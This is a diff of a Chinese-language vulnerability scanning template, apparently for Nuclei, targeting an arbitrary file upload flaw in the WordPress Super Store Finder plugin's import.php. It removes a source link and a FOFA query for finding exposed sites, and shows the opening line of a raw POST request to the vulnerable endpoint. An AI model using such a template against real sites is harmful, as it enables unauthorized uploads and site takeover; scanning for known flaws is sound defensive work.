@@ -3,14 +3,8 @@ info:
   name: WordPressSuperStoreFinder-wp插件import.php任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/8858bdde9b215131ce8b0e6367ef4f97
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 8858bdde9b215131ce8b0e6367ef4f97
-    fofa: + fofa`body="wp-content/plugins/superstorefinder-wp"`
 http:
 - raw:
   - 'POST /wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/import.php HTTP/1.1
